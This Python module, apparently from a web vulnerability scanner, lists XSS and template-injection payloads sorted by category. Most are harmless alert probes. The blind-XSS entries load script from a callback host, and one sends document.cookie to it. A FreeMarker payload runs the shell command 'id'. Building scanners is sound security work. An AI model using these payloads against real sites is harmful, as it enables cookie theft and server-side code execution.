"""
xss_payloads.py
---------------
Central repository of XSS payloads organized by attack category.

All payloads are intended for **detection use inside a sandbox only**.
They inject harmless alert(1) markers to confirm execution context —
no real malicious actions are performed.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List


@dataclass
class XSSPayloadCategory:
    """A named group of XSS payloads."""
    name: str
    description: str
    payloads: List[str] = field(default_factory=list)


# ── 1. Reflected XSS ──────────────────────────────────────────────────────
REFLECTED_PAYLOADS = XSSPayloadCategory(
    name="Reflected XSS",
    description="Payloads injected into parameters that are immediately reflected in the HTML response.",
    payloads=[
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "'\"><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script >alert(1)</script >",
        "<!--<script>alert(1)--></script>",
        "<script/src=data:,alert(1)></script>",
        "<script>/**/alert(1)</script>",
    ],
)

# ── 2. Stored XSS ────────────────────────────────────────────────────────
STORED_PAYLOADS = XSSPayloadCategory(
    name="Stored XSS",
    description="Payloads submitted to storage fields (comment, bio, review) and verified on reload.",
    payloads=[
        "<script>alert('stored-xss')</script>",
        "<img src=x onerror=\"alert('stored')\">",
        "<svg onload=\"alert('stored')\">",
        "<b onmouseover=\"alert('stored')\">hover me</b>",
        "<details open ontoggle=\"alert('stored')\">",
        "<body onload=\"alert('stored')\">",
        "'\"><script>alert('stored-xss')</script>",
    ],
)

# ── 3. DOM-Based XSS (probe payloads injected into URL hash / search) ────
DOM_PROBE_PAYLOADS = XSSPayloadCategory(
    name="DOM-Based XSS",
    description="Payloads targeting client-side DOM APIs. Detected via static JS analysis.",
    payloads=[
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        "?xss=<script>alert(1)</script>",
        "?q=<svg/onload=alert(1)>",
    ],
)

# ── 4. Blind XSS ────────────────────────────────────────────────────────
BLIND_XSS_PAYLOADS = XSSPayloadCategory(
    name="Blind XSS",
    description="Payloads that may execute in an admin panel or back-end view not directly observed.",
    payloads=[
        "<script src=//xss.prahaar.test/b></script>",
        "\"><script src=//xss.prahaar.test/b></script>",
        "<img src=x onerror=\"this.src='//xss.prahaar.test/b?c='+document.cookie\">",
        "'><script src=//xss.prahaar.test/b></script>",
    ],
)

# ── 5. Event Handler XSS ─────────────────────────────────────────────────
EVENT_HANDLER_PAYLOADS = XSSPayloadCategory(
    name="Event Handler XSS",
    description="Payloads using HTML event handlers to trigger script execution.",
    payloads=[
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=\"alert(1)\">",
        "<body onload=alert(1)>",
        "<button onclick=alert(1)>Click</button>",
        "<input autofocus onfocus=alert(1)>",
        "<select onchange=alert(1)><option>1</option></select>",
        "<textarea onfocus=alert(1) autofocus>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
    ],
)

# ── 6. Attribute Injection XSS ───────────────────────────────────────────
ATTRIBUTE_INJECTION_PAYLOADS = XSSPayloadCategory(
    name="Attribute Injection XSS",
    description="Payloads that break out of HTML attribute context to inject event handlers.",
    payloads=[
        "\" onmouseover=\"alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "' onmouseover='alert(1)'",
        "\" onerror=\"alert(1)\" src=\"x",
        '" onload="alert(1)"',
        "\" onpointerenter=\"alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\"><img src=x onerror=alert(1)>",
        "' autofocus onfocus='alert(1)'",
        "\" style=\"animation-name:x\" onanimationstart=\"alert(1)",
    ],
)

# ── 7. JavaScript URI XSS ────────────────────────────────────────────────
JS_URI_PAYLOADS = XSSPayloadCategory(
    name="JavaScript URI XSS",
    description="Payloads that inject javascript: URIs into href, src, or action attributes.",
    payloads=[
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript://comment%0aalert(1)",
        "JaVaScRiPt:alert(1)",
        "javascript&#58;alert(1)",
        "&#106;avascript:alert(1)",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
)

# ── 8. Template Injection (XSS via template engines) ─────────────────────
TEMPLATE_INJECTION_PAYLOADS = XSSPayloadCategory(
    name="Template Injection XSS",
    description="Payloads that exploit server-side template engines to render or execute code.",
    payloads=[
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self}}",
        "${alert(1)}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% debug %}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
    ],
)

# ── 9. Mutation XSS (mXSS) ───────────────────────────────────────────────
MUTATION_PAYLOADS = XSSPayloadCategory(
    name="Mutation XSS",
    description="Payloads exploiting HTML parser mutations to smuggle script content.",
    payloads=[
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
        "<svg><![CDATA[><image xlink:href=\"]]><img/onerror=alert(1)//\">",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<!--<br/type=\"--><img src=x onerror=alert(1)>-->",
        "<table><caption><p><b><u><s></caption></table><script>alert(1)</script>",
    ],
)

# ── 10. Polyglot XSS ─────────────────────────────────────────────────────
POLYGLOT_PAYLOADS = XSSPayloadCategory(
    name="Polyglot XSS",
    description="Multi-context payloads capable of executing across different parsing contexts.",
    payloads=[
        '"><svg/onload=alert(1)>',
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//-->"
        "</SCRIPT>'><SCRIPT>alert(1)</SCRIPT>",
        "<img src=`x`onerror=alert(1)>",
        '\'"><img src=x onerror=alert(1)>',
        "<a href=\"javascript&#x3A;alert(1)\">click</a>",
        '">\'><svg onload=alert(1)>',
        "<--`<img/src=` onerror=alert(1)>`-->",
    ],
)


# ── Full category list ────────────────────────────────────────────────────

ALL_XSS_CATEGORIES: List[XSSPayloadCategory] = [
    REFLECTED_PAYLOADS,
    STORED_PAYLOADS,
    DOM_PROBE_PAYLOADS,
    BLIND_XSS_PAYLOADS,
    EVENT_HANDLER_PAYLOADS,
    ATTRIBUTE_INJECTION_PAYLOADS,
    JS_URI_PAYLOADS,
    TEMPLATE_INJECTION_PAYLOADS,
    MUTATION_PAYLOADS,
    POLYGLOT_PAYLOADS,
]


# ── Convenience helpers ──────────────────────────────────────────────────

def get_all_xss_payloads() -> Dict[str, List[str]]:
    """Return every category as ``{category_name: [payloads]}``."""
    return {cat.name: cat.payloads for cat in ALL_XSS_CATEGORIES}


def get_xss_category_names() -> List[str]:
    return [cat.name for cat in ALL_XSS_CATEGORIES]
